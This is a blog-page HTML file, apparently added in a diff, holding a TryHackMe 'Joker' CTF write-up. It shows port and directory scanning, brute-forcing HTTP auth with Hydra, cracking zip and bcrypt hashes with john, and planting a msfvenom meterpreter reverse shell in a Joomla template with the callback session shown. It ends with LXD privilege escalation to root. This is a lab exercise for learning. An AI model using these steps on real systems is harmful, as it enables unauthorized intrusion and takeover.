@@ -1,0 +1,537 @@
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <title>JockerCTF | write-up</title>
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" type="text/css" href="../assets/built/screen.css?v=2cd93994f3">
+
+    <link rel="shortcut icon" href="../favicon.png" type="image/png">
+    <link rel="canonical" href="index.html">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <link rel="amphtml" href="amp/index.html">
+    
+    <meta property="og:site_name" content="fr33s0ul">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="JockerCTF | write-up">
+    <meta property="og:description" content="Hello world, I hope you are all well and safe home from the epidemic, today's challenge is a CTF by Tryhackme is rated medium, but still it needs focus and trying the right techniques, or you'll just dive in a rabbit hole. Let's get started with some enumeration ... root@kali:">
+    <meta property="og:url" content="http://localhost:2368/jockerctf-write-up/">
+    <meta property="og:image" content="http://localhost:2368/content/images/2020/04/joker.jpg">
+    <meta property="article:published_time" content="2020-04-07T16:31:26.000Z">
+    <meta property="article:modified_time" content="2020-04-07T21:09:18.000Z">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="JockerCTF | write-up">
+    <meta name="twitter:description" content="Hello world, I hope you are all well and safe home from the epidemic, today's challenge is a CTF by Tryhackme is rated medium, but still it needs focus and trying the right techniques, or you'll just dive in a rabbit hole. Let's get started with some enumeration ... root@kali:">
+    <meta name="twitter:url" content="http://localhost:2368/jockerctf-write-up/">
+    <meta name="twitter:image" content="http://localhost:2368/content/images/2020/04/joker.jpg">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="fr33s0ul">
+    <meta name="twitter:site" content="@fr33soul_">
+    <meta name="twitter:creator" content="@fr33soul_">
+    <meta property="og:image:width" content="1322">
+    <meta property="og:image:height" content="1080">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "fr33s0ul",
+        "url": "http://localhost:2368/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": {
+                "@type": "ImageObject",
+                "url": "http://localhost:2368/content/images/2020/03/logo.gif",
+                "width": 300,
+                "height": 41
+            }
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "fr33s0ul",
+        "image": {
+            "@type": "ImageObject",
+            "url": "http://localhost:2368/content/images/2020/03/asdasd.gif",
+            "width": 600,
+            "height": 594
+        },
+        "url": "http://localhost:2368/author/fr33s0ul/",
+        "sameAs": [
+            "https://twitter.com/fr33soul_"
+        ]
+    },
+    "headline": "JockerCTF | write-up",
+    "url": "http://localhost:2368/jockerctf-write-up/",
+    "datePublished": "2020-04-07T16:31:26.000Z",
+    "dateModified": "2020-04-07T21:09:18.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "http://localhost:2368/content/images/2020/04/joker.jpg",
+        "width": 1322,
+        "height": 1080
+    },
+    "description": "Hello world, I hope you are all well and safe home from the epidemic, today&#x27;s\nchallenge is a CTF by Tryhackme is rated medium, but still it needs focus and\ntrying the right techniques, or you&#x27;ll just dive in a rabbit hole.\n\nLet&#x27;s get started with some enumeration ...\n\nroot@kali:~# nmap -sV -sC 10.10.215.43 \nStarting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 16:30 UTC\nNmap scan report for ip-10-10-215-43.eu-west-1.compute.internal (10.10.215.43)\nHost is up (0.0010s latency).\nNot shown: 997 clo",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "http://localhost:2368/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 3.12">
+    <link rel="alternate" type="application/rss+xml" title="fr33s0ul" href="../rss/index.html">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-111725042-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-111725042-2');
+</script>
+
+</head>
+<body class="post-template">
+
+    <div class="site-wrapper">
+
+        
+
+<header class="site-header">
+    <div class="outer site-nav-main">
+    <div class="inner">
+        <nav class="site-nav">
+    <div class="site-nav-left-wrapper">
+        <div class="site-nav-left">
+                <a class="site-nav-logo" href="../"><img src="../content/images/size/w1000/2020/03/logo.gif" alt="fr33s0ul"></a>
+            <div class="site-nav-content">
+                    <ul class="nav" role="menu">
+    <li class="nav-home" role="menuitem"><a href="../">Home</a></li>
+    <li class="nav-whoami" role="menuitem"><a href="../whoami/">whoami</a></li>
+</ul>
+
+                    <span class="nav-post-title ">JockerCTF | write-up</span>
+            </div>
+        </div>
+    </div>
+    <div class="site-nav-right">
+            <div class="social-links">
+                    <a class="social-link social-link-tw" href="https://twitter.com/fr33soul_" title="Twitter" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"></path></svg>
+</a>
+            </div>
+                <a class="rss-button" href="https://feedly.com/i/subscription/feed/http://localhost:2368/rss/" title="RSS" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><circle cx="6.18" cy="17.82" r="2.18"></circle><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"></path></svg>
+</a>
+
+    </div>
+</nav>
+    </div>
+</div></header>
+
+
+<main id="site-main" class="site-main outer">
+    <div class="inner">
+
+        <article class="post-full post ">
+
+            <header class="post-full-header">
+
+
+                <h1 class="post-full-title">JockerCTF | write-up</h1>
+
+
+                <div class="post-full-byline">
+
+                    <section class="post-full-byline-content">
+
+                        <ul class="author-list">
+                            <li class="author-list-item">
+
+                                <div class="author-card">
+                                    <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul">
+                                    <div class="author-info">
+                                        <h2>fr33s0ul</h2>
+                                        <p>Read <a href="../author/fr33s0ul/">more posts</a> by this author.</p>
+                                    </div>
+                                </div>
+
+                                <a href="../author/fr33s0ul/" class="author-avatar">
+                                    <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul">
+                                </a>
+
+                            </li>
+                        </ul>
+
+                        <section class="post-full-byline-meta">
+                            <h4 class="author-name"><a href="../author/fr33s0ul/">fr33s0ul</a></h4>
+                            <div class="byline-meta-content">
+                                <time class="byline-meta-date" datetime="2020-04-07">7 Apr 2020</time>
+                                <span class="byline-reading-time"><span class="bull">•</span> 8 min read</span>
+                            </div>
+                        </section>
+
+                    </section>
+
+
+                </div>
+            </header>
+
+            <figure class="post-full-image">
+                <img srcset="../content/images/size/w300/2020/04/joker.jpg 300w,
+                           ../content/images/size/w600/2020/04/joker.jpg 600w,
+                          ../content/images/size/w1000/2020/04/joker.jpg 1000w,
+                         ../content/images/size/w2000/2020/04/joker.jpg 2000w" sizes="(max-width: 800px) 400px,
+                        (max-width: 1170px) 1170px,
+                            2000px" src="../content/images/size/w2000/2020/04/joker.jpg" alt="JockerCTF | write-up">
+            </figure>
+
+            <section class="post-full-content">
+                <div class="post-content">
+                    <p>Hello world, I hope you are all well and safe home from the epidemic, today's challenge is a CTF by Tryhackme is rated medium, but still it needs focus and trying the right techniques, or you'll just dive in a rabbit hole.</p><p>Let's get started with some enumeration ...</p><pre><code>root@kali:~# nmap -sV -sC 10.10.215.43 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 16:30 UTC
+Nmap scan report for ip-10-10-215-43.eu-west-1.compute.internal (10.10.215.43)
+Host is up (0.0010s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
+|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
+|_  256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: HA: Joker
+8080/tcp open  http    Apache httpd 2.4.29
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=Please enter the password.
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 401 Unauthorized
+MAC Address: 02:9E:D8:EE:E7:2C (Unknown)
+Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds
+</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-07-at-17.31.50.png" class="kg-image"></figure><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-07-at-17.32.05.png" class="kg-image"></figure><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/12qASHliHqDPSo" width="328" height="480" frameborder="0" class="giphy-embed" allowfullscreen></iframe><p><a href="https://giphy.com/gifs/joker-12qASHliHqDPSo"></a></p><!--kg-card-end: html--><p>well well well, we have three ports <strong>ssh</strong> on 22 and some <strong>apache</strong> on 80 and 8080, It seems that we need credentials to access something in port 8080.</p><p>we'll dig more in port 80 and see if we have any interesting directories and files.</p><pre><code>root@kali:~# dirb http://10.10.215.43/
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Apr  7 16:37:56 2020
+URL_BASE: http://10.10.215.43/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.215.43/ ----
+==&gt; DIRECTORY: http://10.10.215.43/css/                                            
+==&gt; DIRECTORY: http://10.10.215.43/img/                                            
++ http://10.10.215.43/index.html (CODE:200|SIZE:5954)                              
++ http://10.10.215.43/phpinfo.php (CODE:200|SIZE:94848)                            
++ http://10.10.215.43/server-status (CODE:403|SIZE:277)  </code></pre><pre><code class="language-markup">root@kali:~# dirb http://10.10.215.43/ -X .txt
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Apr  7 16:38:47 2020
+URL_BASE: http://10.10.215.43/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+EXTENSIONS_LIST: (.txt) | (.txt) [NUM = 1]
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.215.43/ ----
++ http://10.10.215.43/secret.txt (CODE:200|SIZE:320)                               
+                                                                                   
+-----------------
+END_TIME: Tue Apr  7 16:38:49 2020
+DOWNLOADED: 4612 - FOUND: 1
+root@kali:~# </code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-07-at-17.40.16.png" class="kg-image"></figure><p>And we have a secret conversation between Batman and the Joker, checking other directories and backend php file info doesn't give us anything for now ...</p><p>our next shot, some bruteforcing in port 8080 and using Batman or Joker as a username and see what we get.</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-07-at-19.30.39.png" class="kg-image"></figure><p>Xhydra is the GUI version of hydra, both of them work fine. But I choose the GUI version because it was faster and less troubleshooting for my machine.</p><p>the password used by Joker is h****h, with dirbuster or dirb or gobuster we can't look for directories so we will use nikto with the credentials, and see if we can do anything with them 🙃</p><pre><code>root@kali:~# nikto -h http://10.10.215.43:8080/ -id joker:h****h
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.215.43
++ Target Hostname:    10.10.215.43
++ Target Port:        8080
++ Start Time:         2020-04-07 18:31:07 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ / - Requires Authentication for realm ' Please enter the password.'
++ Successfully authenticated to realm ' Please enter the password.' with user-supplied credentials.
++ Entry '/administrator/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/bin/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/cache/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/cli/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/components/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/includes/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/language/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/layouts/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/libraries/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/modules/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/plugins/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/tmp/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 14 entries which should be manually viewed.
++ /backup.zip: Potentially interesting archive/cert file found.
++ /backup.zip: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
++ Uncommon header 'tcn' found, with contents: choice
++ OSVDB-3092: /web.config: ASP config file is accessible.
++ OSVDB-8193: /index.php?module=ew_filemanager&amp;type=admin&amp;func=manager&amp;pathext=../../../etc: EW FileManager for PostNuke allows arbitrary file retrieval.
++ OSVDB-3092: /administrator/: This might be interesting...
++ OSVDB-3092: /bin/: This might be interesting...
++ OSVDB-3092: /includes/: This might be interesting...
++ OSVDB-3092: /tmp/: This might be interesting...
++ OSVDB-3092: /README: README file found.
++ OSVDB-3092: /LICENSE.txt: License file found may identify site software.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /htaccess.txt: Default Joomla! htaccess.txt file found. This should be removed or renamed.
++ /administrator/index.php: Admin login page/section found.
++ 8719 requests: 0 error(s) and 34 item(s) reported on remote host
++ End Time:           2020-04-07 18:31:43 (GMT0) (36 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+root@kali:~# 
+</code></pre><p>we gathered a lot of useful information, the first thing that got my attention was the <strong>backup.zip</strong> file and the <strong>/administrator</strong> directory.</p><p>After downloading the backup.zip file it was encrypted, but not for so long ...</p><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/26xBN6I5tVKveX2wg" width="480" height="256" frameborder="0" class="giphy-embed" allowfullscreen></iframe><p><a href="https://giphy.com/gifs/johnwick2-lionsgate-john-wick-26xBN6I5tVKveX2wg"></a></p><!--kg-card-end: html--><pre><code>root@kali:~/Downloads# zip2john backup.zip &gt; hash
+root@kali:~/Downloads# john hash --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+h****h           (backup.zip)
+1g 0:00:00:00 DONE (2020-04-07 18:34) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed</code></pre><p>Thank you Joker for using the same passwords 😶, after decompressing the backup we found a database and a backup of the whole site. </p><p>the database contained the credentials to access the running site and that's what we did, our next step will be getting a reverse shell, obviously after we decrypt the admin password... obviously 🙄 </p><pre><code>INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',0,1,'2019-10-08 12:00:15',</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-07-at-19.45.31.png" class="kg-image"></figure><pre><code>" target="_blankroot@kali:~# john hash --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+a******4         (?)
+1g 0:00:00:14 DONE (2020-04-07 18:48) 0.06997g/s 71.79p/s 71.79c/s 71.79C/s bullshit..bulldogs
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+root@kali:~# 
+</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-07-at-19.50.16.png" class="kg-image"></figure><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-07-at-19.50.50.png" class="kg-image"></figure><p>go to extension, and upload your reverse shell. I created mine with msfvenom the payload <strong>php/meterpreter/reverse_tcp</strong> exported it as raw php and uploaded it in the error.php file and previewed it from the site and it called back to us.</p><pre><code>root@kali:~# msfconsole
+[-] ***rting the Metasploit Framework console.../
+[-] * WARNING: No database support: No database YAML file
+[-] ***
+                                                  
+     ,           ,
+    /             \
+   ((__---,,,---__))
+      (_) O O (_)_________
+         \ _ /            |\
+          o_o \   M S F   | \
+               \   _____  |  *
+                |||   WW|||
+                |||     |||
+
+
+       =[ metasploit v5.0.71-dev                          ]
++ -- --=[ 1962 exploits - 1095 auxiliary - 336 post       ]
++ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+msf5 &gt; use exploit/multi/handler
+msf5 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp
+payload =&gt; php/meterpreter/reverse_tcp                                              
+msf5 exploit(multi/handler) &gt; set lhost 10.10.188.92                                
+lhost =&gt; 10.10.188.92                                                               
+msf5 exploit(multi/handler) &gt; set lport 7878                                        
+lport =&gt; 7878                                                                       
+msf5 exploit(multi/handler) &gt; run                                                   
+                                                                                    
+[*] Started reverse TCP handler on 10.10.188.92:7878                                
+[*] Sending stage (38288 bytes) to 10.10.215.43                                     
+[*] Meterpreter session 1 opened (10.10.188.92:7878 -&gt; 10.10.215.43:34370) at 2020-04-07 19:00:43 +0000                                                                 
+                                                                                    
+meterpreter &gt; getuid
+Server username: www-data (33)                                                      
+meterpreter &gt;                          </code></pre><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/UoYA5jnXE5V7u4MJh7" width="480" height="480" frameborder="0" class="giphy-embed" allowfullscreen></iframe><p><a href="https://giphy.com/gifs/joker-the-dark-knight-washing-hands-UoYA5jnXE5V7u4MJh7"></a></p><!--kg-card-end: html--><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-07-at-20.06.11.png" class="kg-image"></figure><p>if we look closer we are part of a group called lxd, for me i just learned what is lxd (linux containers) and how do they work ... I would suggest reading the article that I'll leave at the end, so you can learn more about lxd and the privilege escalation that can be done.</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-07-at-20.07.56.png" class="kg-image"></figure><pre><code class="language-markup">$ lxc init myalpine joker -c security.privileged=true
+Creating Joker
+$ lxc config device add joker mydevice disk source=/ path=/mnt/root recursive=true
+$ lxc start joker
+$ lxc exec ignite /bin/sh
+whoami
+root</code></pre><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/p8EJ11ZuJlIxG" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen></iframe><p><a href="https://giphy.com/gifs/reaction-p8EJ11ZuJlIxG"></a></p><!--kg-card-end: html--><p>That's it for today, stay safe, and HAPPY HACKING!</p><figure class="kg-card kg-embed-card"><blockquote class="wp-embedded-content"><a href="https://www.hackingarticles.in/lxd-privilege-escalation/">Lxd Privilege Escalation</a></blockquote>
+<script type="text/javascript">
+<!--//--><![CDATA[//><!--
+		/*! This file is auto-generated */
+		!function(d,l){"use strict";var e=!1,o=!1;if(l.querySelector)if(d.addEventListener)e=!0;if(d.wp=d.wp||{},!d.wp.receiveEmbedMessage)if(d.wp.receiveEmbedMessage=function(e){var t=e.data;if(t)if(t.secret||t.message||t.value)if(!/[^a-zA-Z0-9]/.test(t.secret)){var r,a,i,s,n,o=l.querySelectorAll('iframe[data-secret="'+t.secret+'"]'),c=l.querySelectorAll('blockquote[data-secret="'+t.secret+'"]');for(r=0;r<c.length;r++)c[r].style.display="none";for(r=0;r<o.length;r++)if(a=o[r],e.source===a.contentWindow){if(a.removeAttribute("style"),"height"===t.message){if(1e3<(i=parseInt(t.value,10)))i=1e3;else if(~~i<200)i=200;a.height=i}if("link"===t.message)if(s=l.createElement("a"),n=l.createElement("a"),s.href=a.getAttribute("src"),n.href=t.value,n.host===s.host)if(l.activeElement===a)d.top.location.href=t.value}}},e)d.addEventListener("message",d.wp.receiveEmbedMessage,!1),l.addEventListener("DOMContentLoaded",t,!1),d.addEventListener("load",t,!1);function t(){if(!o){o=!0;var e,t,r,a,i=-1!==navigator.appVersion.indexOf("MSIE 10"),s=!!navigator.userAgent.match(/Trident.*rv:11\./),n=l.querySelectorAll("iframe.wp-embedded-content");for(t=0;t<n.length;t++){if(!(r=n[t]).getAttribute("data-secret"))a=Math.random().toString(36).substr(2,10),r.src+="#?secret="+a,r.setAttribute("data-secret",a);if(i||s)(e=r.cloneNode(!0)).removeAttribute("security"),r.parentNode.replaceChild(e,r)}}}}(window,document);
+//--><!]]>
+</script><iframe sandbox="allow-scripts" security="restricted" src="https://www.hackingarticles.in/lxd-privilege-escalation/embed/" width="600" height="338" title="“Lxd Privilege Escalation” — Hacking Articles" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" class="wp-embedded-content"></iframe></figure>
+                </div>
+            </section>
+
+
+
+        </article>
+
+    </div>
+</main>
+
+<aside class="read-next outer">
+    <div class="inner">
+        <div class="read-next-feed">
+
+
+                <article class="post-card post ">
+
+    <a class="post-card-image-link" href="../toolsrus-ctf-write-up/">
+        <img class="post-card-image" srcset="../content/images/size/w300/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg 300w,
+                   ../content/images/size/w600/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg 600w,
+                  ../content/images/size/w1000/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg 1000w,
+                 ../content/images/size/w2000/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg 2000w" sizes="(max-width: 1000px) 400px, 700px" src="../content/images/size/w600/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg" alt="ToolsRus CTF | write-up">
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="../toolsrus-ctf-write-up/">
+
+            <header class="post-card-header">
+                <h2 class="post-card-title">ToolsRus CTF | write-up</h2>
+            </header>
+
+            <section class="post-card-excerpt">
+                    <p>Hello all, todays challenge is made by Tryhackme.com, it's a fun CTF ratted as easy, totally straight forward. Let's enumerate the machine root@kali:~# nmap -sC -sV 10.10.</p>
+            </section>
+
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+            
+                    <div class="author-name-tooltip">
+                        fr33s0ul
+                    </div>
+            
+                    <a href="../author/fr33s0ul/" class="static-avatar">
+                        <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul">
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="../author/fr33s0ul/">fr33s0ul</a></span>
+                <span class="post-card-byline-date"><time datetime="2020-04-03">3 Apr 2020</time> <span class="bull">•</span> 6 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+        </div>
+    </div>
+</aside>
+
+
+
+
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="../">fr33s0ul</a> © 2020</section>
+                <nav class="site-footer-nav">
+                    <a href="../">Latest Posts</a>
+                    
+                    <a href="https://twitter.com/fr33soul_" target="_blank" rel="noopener">Twitter</a>
+                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
+                </nav>
+            </div>
+        </footer>
+
+    </div>
+
+
+    <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous">
+    </script>
+    <script src="../assets/built/casper.js?v=2cd93994f3"></script>
+
+    <script>
+        // Parse the URL parameter
+        function getParameterByName(name, url) {
+            if (!url) url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        }
+
+        // Give the parameter a variable name
+        var action = getParameterByName('action');
+
+        $(document).ready(function () {
+            if (action == 'subscribe') {
+                $('body').addClass("subscribe-success");
+            }
+
+            $('.subscribe-success-message .subscribe-close').click(function () {
+                $('.subscribe-success-message').addClass('close');
+            });
+
+            // Reset form on opening subscrion overlay
+            $('.subscribe-button').click(function() {
+                $('.subscribe-overlay form').removeClass();
+                $('.subscribe-email').val('');
+            });
+        });
+    </script>
+
+    <script>
+    $(document).ready(function () {
+        // FitVids - start
+        var $postContent = $(".post-full-content");
+        $postContent.fitVids();
+        // FitVids - end
+
+        // Replace nav with title on scroll - start
+        Casper.stickyNavTitle({
+            navSelector: '.site-nav-main',
+            titleSelector: '.post-full-title',
+            activeClass: 'nav-post-title-active'
+        });
+        // Replace nav with title on scroll - end
+
+        // Hover on avatar
+        var hoverTimeout;
+        $('.author-list-item').hover(function () {
+            var $this = $(this);
+
+            clearTimeout(hoverTimeout);
+
+            $('.author-card').removeClass('hovered');
+            $(this).children('.author-card').addClass('hovered');
+
+        }, function () {
+            var $this = $(this);
+
+            hoverTimeout = setTimeout(function () {
+                $this.children('.author-card').removeClass('hovered');
+            }, 800);
+        });
+    });
+</script>
+
+
+    
+
+</body>
